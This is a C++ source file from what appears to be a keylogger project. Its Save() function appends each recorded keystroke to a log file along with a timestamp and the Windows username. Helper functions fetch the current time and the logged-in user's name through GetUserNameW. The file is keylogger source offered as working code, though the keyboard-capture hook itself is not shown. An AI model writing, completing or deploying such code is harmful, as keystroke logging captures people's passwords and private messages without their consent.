#ifndef __KEYLOGGER_H
#include "./KeyLogger.h"
#endif
void Save(int _key, string file)
{
    ofstream kout(file, ios::app);
    if (!kout)
    {
        cerr << "Error opening file: " << file << endl;
        return;
    }

    // Current time
    string timeStr = GetTimeString();
    kout << "[" << timeStr << "] ";

    // Username
    string username = GetUsername();
    kout << "User: " << username << " ";

    // Key
    if (keyMap.count(_key)) kout << keyMap[_key];
    else kout << char(_key);
    kout << endl;
    kout.close();
    return;
}

string GetTimeString()
{
    time_t now = time(nullptr);
    struct tm *timeinfo = localtime(&now);
    char buffer[80];
    strftime(buffer, 80, "%Y-%m-%d %H:%M:%S", timeinfo);
    return string(buffer);
}

string GetUsername()
{
    wchar_t username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    if (GetUserNameW(username, &username_len))
    {
        // Convert wide string to a standard string
        char charUsername[UNLEN + 1];
        wcstombs(charUsername, username, username_len);
        return string(charUsername);
    }
    return "UnknownUser";
}